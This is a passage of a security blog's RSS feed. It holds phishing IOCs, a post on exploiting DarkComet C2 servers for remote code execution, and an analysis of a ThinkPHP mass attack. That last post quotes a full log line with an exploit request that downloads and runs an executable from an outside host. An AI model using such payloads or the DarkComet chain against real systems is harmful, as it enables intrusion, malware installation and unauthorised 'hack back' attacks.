hxxp://my-leboncoin[.]top
hxxp://www.my-leboncoin[.]top
hxxp://www.a-leboncoin[.]info
hxxp://www.llc-leboncoin[.]info
hxxp://www.leboncoin-ql[.]info
hxxp://my-leboncoin[.]info
hxxp://www.leboncoin-tr[.]top
hxxp://leboncoin-tr[.]top
hxxp://www.my-leboncoin[.]info
hxxp://llc-leboncoin[.]info
hxxp://leboncoin-ql[.]info
hxxp://leboncoin-bk[.]top
hxxp://www.leboncoin-my[.]top
hxxp://leboncoin-my[.]info
hxxp://www.leboncoin-bk[.]top
hxxp://leboncoin-my[.]top
hxxp://www.leboncoin-my[.]info
hxxp://leboncoin-bk[.]info
hxxp://leboncoin-tr[.]info
hxxp://www.leboncoin-tr[.]info
hxxp://www.leboncoin-bk[.]info
hxxp://www.leboncoin-vd[.]info
hxxp://leboncoin-vd[.]top
hxxp://leboncoin-vd[.]info
hxxp://www.leboncoin-vd[.]top
hxxp://leboncoin-cz[.]top
hxxp://www.leboncoin-cz[.]top
hxxp://www.leboncoin-cz[.]info
hxxp://leboncoin-cz[.]info
hxxp://leboncoin-jp[.]top
hxxp://leboncoin-jp[.]info
hxxp://leboncoin-xc[.]info
hxxp://www.leboncoin-xc[.]info
hxxp://www.leboncoin-jp[.]info
hxxp://www.leboncoin-jp[.]top
hxxp://leboncoin-mp[.]top
hxxp://www.leboncoin-xc[.]top
hxxp://leboncoin-lx[.]top
hxxp://leboncoin-lp[.]info
hxxp://leboncoin-ml[.]top
hxxp://leboncoin-kp[.]top
hxxp://leboncoin-kz[.]top
hxxp://leboncoin-lv[.]top
hxxp://leboncoin-sl[.]top
hxxp://arbeit.jobs-hegele[.]in

08/05/2019 com.bertjerts 172eb70cd27b6d24b47abe39c887c2fd6164f238a4c18877aad139c1de9ed6a9
08/05/2019 com.backsmart a289da988c92c9889c0efb9901b5e875fb2a37dbb0cbd31708dba647bdf4c403
12/05/2019 com.bertrander 5f7b91bcd4877802a5b1a69bb322fa934d4a9ec1b5ac1a472636de57c33e07c3
18/05/2019 com.jertay 1bc805d19613bbab15027bd7d29a5bc3b8709bff0c7fd49cf04bb998cfc09b0d
08/06/2019 com.garson f22ea76a0d69cf03915fd17f6472b790c21fecea70ff94520cbed71e8eeba198

11/06/2019 com.lebronjoin b9610d39792609dc56fe0058571ec786df65e43e522d123eb26b5c5532737234 (WTF?)
11/06/2019 com.berlins 225023859abbad7f788a47dd72ea3b702799360b50b69dc670b6fb1c02e5bf64

</pre>
<p>The post <a rel="nofollow" href="https://hackonch.ml/malware-hunting/investigation-russian-phishing-campaign-via-text-messages-on-leboncoin/">Investigation: Russian phishing campaign via text messages on leboncoin</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></content:encoded>
							<wfw:commentRss>https://hackonch.ml/malware-hunting/investigation-russian-phishing-campaign-via-text-messages-on-leboncoin/feed/</wfw:commentRss>
		<slash:comments>1</slash:comments>
							</item>
		<item>
		<title>Malware Hunting : The end of DarkComet</title>
		<link>https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/</link>
				<comments>https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/#respond</comments>
				<pubDate>Tue, 14 May 2019 18:36:13 +0000</pubDate>
		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
				<category><![CDATA[Fun]]></category>
		<category><![CDATA[Malware-Hunting]]></category>

		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=983</guid>
				<description><![CDATA[<div class="post-excerpt">Hi everyone! I don&#8217;t know about you but when I was younger, there was a huge trend into making videos about hacking tutorials on Windows. It was also at that&#8230;</div>
<div class="post-more"><a href="https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/">Malware Hunting : The end of DarkComet</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></description>
								<content:encoded><![CDATA[<p>Hi everyone!</p>
<p>I don&#8217;t know about you but when I was younger, there was a huge trend into making videos about hacking tutorials on Windows. It was also at that time that tools like <strong> LOIC </strong> became so popular. Hacking has became literally a &#8220;point to click&#8221; concept, as in video games.</p>
<p>We will deal today a with software that also became popular at that time: <strong> DarkComet </strong></p>
<h3> A bit of History </h3>
<p>DarkComet was a Trojan horse (a type of software known by its abbreviation &#8220;RAT&#8221;) developed by an independent French programmer.</p>
<p>Although this software was developed in 2008, it began to proliferate in early 2012. The software development was canceled, partly because of its misuse during the Syrian civil war to monitor activists, but also because his creator was afraid to be arrested.</p>
<h3> Usage </h3>
<p>It should be noted that even if its development was stopped in July 2012, the software is still widely used as shown by these fresh statistics I concocted with the help of Shodan:</p>
<p><center><img src = "https://i.imgur.com/4qYKNRm.jpg" alt = "" width = "800" height = "600" class = " alignnone size-medium wp-image-1002 "/><figcaption> C&#038;C distribution in France among the 5 most used trojans</figcaption></center></p>
<p>As can be seen, more than 50% of the 5 most common Trojan horses detected by Shodan in France are DarkComet servers.</p>
<p>If the patriotic hack back was authorized as in the previous post, it would probably be necessary to attack DarkComet C2C servers because they are widely used.</p>
<h3> What we already know </h3>
<p>Darkcomet has been vulnerable in the past. In fact, since 2015, we know that it&#8217;s possible to lead to an arbitrary File Download on any DarkComet C2C server. A good starting point would be to examine the functionality of DarkComet file sending (from attacker to victim).</p>
<p>The server uses a very specific transaction model that looks like this (&#8220;S&#8221; refers to the server and &#8220;I&#8221; the infected computer):</p>
<p><Pre><br />
S: QUICKUP C: file.jpg | 123 | UploadExec<br />
The client initiates a new connection with &#8220;QUICKUP&#8221;</p>
<p>I: QUICKUP 123 | C: file.jpg | UploadExec<br />
S: &#8220;x41x00x43&#8221;<br />
I: Ack<br />
S: &#8220;file length&#8221;<br />
I: Ack<br />
S: &#8220;raw binary stream&#8221;<br />
</Pre></p>
<p>The C&#038;C server doesn&#8217;t check if it has already issued a download command. This means that anyone connecting to the server can download any file from the server.<br />
Unfortunately, since there is no way for the server to list all the files in a directory, this vulnerability is limited to downloading files known to the attacker.</p>
<p>Among the various files that can be reached, we can have fun targeting two sensitive files for the server:</p>
<p>1¬∞) comet.db which, as the name suggests, is a database (SQLite) actually containing a list of all infected computers (including IP/MAC addresses, Country, current user name, operating system version,&#8230;). This database can also contain keystroke recording data.</p>
<p>2¬∞) config.ini which contains all passwords in plain text related to the the DarkComet server configuration.</p>
<p>As said previsouly, this vulnerability is interesting to say the least but unfortunately, it doesn&#8217;t allow us directly to get stable foothold on the server.</p>
<h3> A bit of research </h3>
<p>Let&#8217;s take a look now at the downloading function (from victim to attacker).<br />
When the DarkComet server tries to download a file, here&#8217;s what actually happens:</p>
<p><Pre><br />
S: DOWNLOADFILE 596 | C: file.jpg<br />
The client then opens a new connection:</p>
<p>I: FILETRANSFER | 596<br />
S: &#8220;x41x00x43&#8221;<br />
I: FILEBOF C: file.jpg | 0<br />
S: Ack<br />
I: &#8220;raw binary stream&#8221;<br />
</Pre></p>
<p>The server write the file to a directory specified by the user with the name &#8220;file.jpg&#8221;. Although it may seem as exploitable as the previous function, it&#8217;s unfortunately not. In fact, the 596 in &#8220;DOWNLOADFILE 596&#8221; is the identifier of a<a href="https://en.wikipedia.org/wiki/Socket" rel="noopener noreferrer" target="_blank"> socket </a>. The server wouldn&#8217;t accept FILETRANSFER | 596 if it has not previously issued on an identical socket.</p>
<p>It&#8217;s not obvious at first sight but the vulnerability is there. I let the detail to the comrade <strong> PseudoLaboratories </strong> for those interested.</p>
<p>All that to say that the exploitation of the vulnerability leads us to an arbitrary file sending. Wich we can use to provoke a: *roll of drums* &#8230;</p>
<h3> Remote Code Execution !</h3>
<p>The DarkComet server will try to use UPnP by default in order to open ports automatically. To achieve this, it actually writes a file called &#8220;upnp.exe&#8221; to the Temp directory and run it, if necessary.</p>
<p>We could use at first, the arbitrary file download vulnerability to read the current username and then in a second part, we could use the arbitrary file upload in order to send a payload right in the Temp directory. Boom !</p>
<p>At the next server restart, &#8220;upnp.exe&#8221; (overwritten by our payload) will be executed.</p>
<h3> Privilege escalation </h3>
<p>The logical next step in the actual pwnage would be to find a way to get administrator privileges but Darkcomet already dit the job !</p>
<p>Yep, as the software requests administrator privileges at each startup, by inheritance principle, any code executed by Darkcomet is executed with administrator rights, including our payload.</p>
<h3> Conclusion </h3>
<p>DarkComet is a highly developed software, so much that it&#8217;s the most popular trojan in France and in many countries worldwide. It&#8217;s certain that if the software development wasn&#8217;t be terminated. The flaws mentioned in this article wouldn&#8217;t be exploitable.</p>
<p>But with this in mind and if it wasn&#8217;t illegal to hack back bad guys, we could clean up to 50% C2C servers in France and maybe more in other countries.</p>
<p>I hope you liked this article, feel free to leave a comment, a remark, or even a message (I read them all !!)</p>
<p>In my case, I was delighted to write this article, I haven&#8217;t yet chosen my next victim so don&#8217;t hesitate to send me ideas ü§†</p>
<h3> Sources </h3>
<p>https://pseudolaboratories.github.io/DarkComet-upload-vulnerability/<br />
https://www.shodan.io/<br />
https://techanarchy.net/blog/darkcomet-hacking-the-hacker<br />
https://fr.wikipedia.org/wiki/DarkComet</p>
<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/">Malware Hunting : The end of DarkComet</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></content:encoded>
							<wfw:commentRss>https://hackonch.ml/fun/malware-hunting-the-end-of-darkcomet/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							</item>
		<item>
		<title>Analysis of a Chinese Mass Attack (ft. Codoso Team)</title>
		<link>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/</link>
				<comments>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/#respond</comments>
				<pubDate>Sat, 20 Apr 2019 18:05:28 +0000</pubDate>
		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
				<category><![CDATA[Fun]]></category>
		<category><![CDATA[Malware-Hunting]]></category>
		<category><![CDATA[Web]]></category>

		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=796</guid>
				<description><![CDATA[<div class="post-excerpt">Hi everyone ! As you may know, I&#8217;m not joking with cybersecurity. Which means I&#8217;m not joking with the blog. That being said, a good way to ensure the safety&#8230;</div>
<div class="post-more"><a href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/" class="btn btn-primary btn-effect"><span>View Post</span><span><i class="icon icon-arrow-right"></i></span></a></div>
<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></description>
								<content:encoded><![CDATA[<p>Hi everyone !</p>
<p>As you may know, I&#8217;m not joking with cybersecurity. Which means I&#8217;m not joking with the blog. That being said, a good way to ensure the safety of its own equipment is to periodically peel the log files.</p>
<h3> 1¬∞) The Context </h3>
<p>A few days ago, I noticed that more than 50% of http requests received to my website are not actually visitors but hosts targeting the entire internet for vulnerable servers. This is called &#8220;mass attacks&#8221;.</p>
<p>Even if they could be impressive, these mass attacks are very unsophisticated and good practices are generally more than enough to make it meaningless.</p>
<p>However, there was this request, punctual, and quite sophisticated:</p>
<pre> 124.161.103.251 - - [02 /Apr /2019: 17: 17: 41 +0200] "GET /public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp ; vars [1] [] = cmd.exe% 20 /c% 20powershell% 20 (new-object 20System.Net.WebClient%).DownloadFile ( 'http://fid.hognoob.se/download.exe', ' C: /Windows/temp/fbouucstzfhszdw10280.exe '); start% 20C: /Windows/temp/fbouucstzfhszdw10280.exe HTTP /1.1 "301 5" http://blog.tchernobyl.ml/public/index.php?s= index /thinkx5Capp /invokefunction & function = call_user_func_array & vars [0] = system & vars [1] [] = cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile ('http: //fid. hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start C: /Windows/temp/fbouucstzfhszdw10280.exe "" Mozilla /4.0 (compatible; MSIE 9.0; Windows NT 6.1) "<br />
</Pre></p>
<p>To make it simple, this request attempts to execute a powershell command through "index.php". If the server is vulnerable, a file is downloaded, executed in memory and then deleted from disk to cover up traces.</p>
<p>After some verifications, it would be proof of concept on a "ThinkPHP" vulnerability. It's a PHP-based web application development framework distributed under the open source Apache2 license. This framework is very popular in China, where more than 40,000 servers are running ThinkPHP (<a href = "https://securitynews.sonicwall.com/xmlpost/thinkphp-remote-code-execution-rce-bug-is-actively-being -exploited /"rel="noopener noreferrer"target =" _ blank "> source </a>)</p>
<h3> 2¬∞) The Dropper </h3>
<p>First of all, the file is pretty lightweight (only 90 KB) which could mean that this is only a dropper. After being executed, it would download the real payload. This kind of process is widely used by hackers to facilitate and control the execution flow.</p>
<p>At this point, the least we can say is that the individuals who wrote this piece of code are far from being beginners. Although I know that the program was written in C++ by looking at which libraries are loaded, I can't unfortunately say anything else about the development context. For instance, there is no debug artifacts, no comments, nothing at all except the code. Which is rare enough to emphasize it.</p>
<p>Thus, this file succesfully passes the 6th statement of the CIA Development Tradecraft:</p>
<blockquote><p> Raise the difficulty for analysis and reverse-engineering and removes artifacts used for attribution/origination. </p></blockquote>
<h3> 3¬∞) The payload </h3>
<p>During the execution, two other files are successively downloaded and executed: nmbsawer.exe and wercplshost.exe.<br />
One file provide persistent remote access (cmd.exe) and disables Windows Defender protection and the other one provide a cryptocurrency mining tool. I managed to identify the mining pool with a configuration file: pxi.hognoob.se:35791. Fun fact, the mining program is configured to use only 1% of the CPU load.</p>
<p>It seems a little strange to set up the mining rate so low, but keep in mind that servers running on processors costing $ 14.000 each, 1% of the load is actually far from being nothing !</p>
<p>Altogether, there are 6 subdomains involved in this operation:</p>
<p><Pre><br />
upa1.hognoob.se 195.128.127.254 ----> additional components downloaded by the dropper (SERVER A)<br />
upa2.hognoob.se 195.128.127.254 ----> additional components downloaded by the dropper (SERVER A)<br />
q1a.hognoob.se 195.128.127.254 ----> additional components downloaded by the dropper (SERVER A)<br />
uio.hognoob.se 195.128.126.120 ----> ??? (SERVER C)<br />
fid.hognoob.se 195.128.127.254 ----> initial download of the dropper (SERVER A)<br />
pxi.hognoob.se 195.128.124.140 ----> mining pool (SERVER B)<br />
</Pre></p>
<p>Interestingly, some subdomains are "protected" by Cloudflare. I put "protected" with quotes because this "protection" allowed me to get the IP addresses without any problem.</p>
<p>When we have all the IP addresses (which are three), we realize very quickly that all addresses are located in Russia. All except one:<br />
<Pre><br />
http://2019.ip138.com/ic.asp 117.25.157.119 ----> Control and Command (SERVER D)<br />
</Pre></p>
<p>This web address located in China is hard coded into an additional monitoring component downloaded by the dropper. This suggests that this is the address of the Control and Control server. In addition, the extension "asp" reinforces the hypothesis of a Web control on the botnet.</p>
<p>You can also that "2019" in the subdomain name. After some researches, I found that each operation had its own subdomain depending on the year. The oldest I could manage to find is dating back to 2017.</p>
<h3> Verdict </h3>
<p>Although nothing allows us to say that this is an attack orchestrated by Russian hackers, it is obvious that most of the operation infrastructure is located in Russia.</p>
<p>The fact that the biggest benefit of the operation is in China and the coincidence to have a vital server to the operation being also located in China is a bit intriguing.</p>
<p>Even more intriguing is the fact that the domain used for the C&C would be attributed to <a href="https://attack.mitre.org/groups/G0073/"> APT 19 </a>. Also known as the sweet name of "Codoso Team" or "Sunshop Group". It would be a group of independent hackers who would benefit from some form of support from the Chinese government (<a href = "https://www.fireeye.fr/current-threats/apt-groups.html # apt19 "> </a> source)</p>
<p>In short, this is where my little investigations led me to learn a little more about these hackers of the shadows who are so well-known and so unknown at the same time.</p>
<p>I hope you liked this article, feel free to send me messages via the contact form or even in comments to give me your point of view,or if you knew the same situation / a similar situation, I read them all! ü§†</p>
<p>The post <a rel="nofollow" href="https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/">Analysis of a Chinese Mass Attack (ft. Codoso Team)</a> appeared first on <a rel="nofollow" href="https://hackonch.ml">~# Hackonch !</a>.</p>
]]></content:encoded>
							<wfw:commentRss>https://hackonch.ml/fun/analysis-of-a-chinese-mass-attack-ft-codoso-team/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							</item>
	</channel>
</rss>
